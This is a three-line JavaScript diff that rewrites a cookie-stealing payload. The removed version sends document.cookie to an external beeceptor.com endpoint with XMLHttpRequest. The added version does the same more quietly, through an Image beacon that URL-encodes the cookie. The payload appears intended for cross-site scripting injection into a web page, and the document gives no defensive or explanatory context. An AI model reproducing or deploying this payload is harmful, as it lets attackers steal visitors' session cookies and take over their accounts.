@@ -1,3 +1,3 @@
-var xhr = new XMLHttpRequest();
-xhr.open("GET", "https://coolendpoint.free.beeceptor.com/?cookie=" + document.cookie, true);
-xhr.send();
+var img = new Image();
+img.src = 'https://coolendpoint.free.beeceptor.com/?cookie=' + encodeURIComponent(document.cookie);
+document.body.appendChild(img);
